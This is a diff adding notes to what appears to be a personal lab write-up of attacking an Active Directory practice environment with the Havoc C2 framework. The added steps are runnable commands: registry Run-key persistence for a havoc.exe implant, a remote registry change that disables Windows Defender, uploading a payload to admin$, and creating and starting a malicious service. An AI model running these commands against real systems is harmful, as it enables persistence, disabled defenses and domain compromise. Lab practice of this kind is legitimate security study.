@@ -329,11 +329,57 @@ sc_start havoc 192.168.56.11
 
 ##### Fix it or do it the wrong way
 - Here is the wrong way. (I'm running out of time but I'll revisit this and make the right payload)
-- You have about 30 seconds before the service fails.
-- run the havoc executable before you lose the callback.
+- I have about 30 seconds before the service fails.
+- run the havoc executable before  losing the callback.
 ```
 shell c:\Windows\havoc.exe
 ```
 
+### Registry Persistence (Better-ish)
+- Since this VM auto logs in as the user, adding this line to the registry will trigger a callback on that logon.
+```
+shell reg add "\\192.168.56.11\HKLM\Software\Microsoft\Windows\CurrentVersion\Run" /v havoc /t REG_SZ /d "C:\Windows\havoc.exe" /f
+```
+
+### Issues with callbacks dying
+- The loader I'm using is not proving stable in this environment
+- I'm going to disable defender and just use havoc's built in payloads moving forward
+
+##### Disabling Defender
+- i had to modify the reg_set bof and recompile it for this to work properly.
+- Binaries are  in the "reg_set.zip" pw: Jitter
+- paste them here `/usr/share/havoc/client/Modules/RemoteOps/bin/`
+```
+reg_set 192.168.56.11 HKLM "SOFTWARE\Policies\Microsoft\Windows Defender" DisableAntiSpyware REG_DWORD 1
+```
+![](../../../../zzAttachments/Pasted%20image%2020250903142838.png)
+
+##### Verify
+```
+reg_query 192.168.56.11 HKLM "SOFTWARE\Policies\Microsoft\Windows Defender" DisableAntiSpyware
+```
+![](../../../../zzAttachments/Pasted%20image%2020250903142858.png)
+
+### Create malicious service (robb.stark token)
+##### Upload the payload
+```
+cd \\192.168.56.11\admin$
+```
+```
+upload [Path/To/Service.exe]
+```
+
+##### Create the Service
+```
+sc_create havoc havoc c:\Windows\havoc.exe havoc 0 2 3 192.168.56.11
+```
+
+##### Reboot the machine or start the service manually
+```
+sc_start havoc 192.168.56.11
+```
+![](../../../../zzAttachments/Pasted%20image%2020250903143458.png)
+
 ### Own the Winterfell DC
+
 
